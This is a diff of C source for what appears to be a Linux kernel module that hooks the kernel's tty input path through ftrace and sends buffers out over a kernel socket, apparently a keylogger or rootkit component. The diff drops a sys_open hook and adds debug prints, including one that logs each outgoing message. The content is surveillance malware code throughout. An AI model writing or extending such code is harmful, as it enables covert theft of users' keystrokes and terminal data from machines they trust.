@@ -223,7 +223,6 @@ static asmlinkage long ftrace_open(const char __user *filename,
 }
 
 static struct ftrace_hook tty_hooks[] = {
-	HOOK("sys_open", ftrace_open, &real_open),
 	HOOK("tty_insert_flip_string_fixed_flag", ftrace_fixed_flag, &tty_fixed_flag)
 };
 
@@ -267,8 +266,10 @@ static int ksock_send(struct socket *sock, struct sockaddr_in *addr,
 	struct msghdr msg;
 	struct iovec iov;
 	
-	if(sock->sk == NULL)
+	if(sock->sk == NULL) {
+		pr_info("ksock is null");
 		return 0;
+	}
 
 	iov.iov_base = buf;
 	iov.iov_len = len;
@@ -281,6 +282,8 @@ static int ksock_send(struct socket *sock, struct sockaddr_in *addr,
 	msg.msg_control = NULL;
 	msg.msg_controllen = 0;
 	msg.msg_control = NULL;
+
+	pr_info("message: %s", buf);
 
 	size = sock_sendmsg(sock, &msg);
 
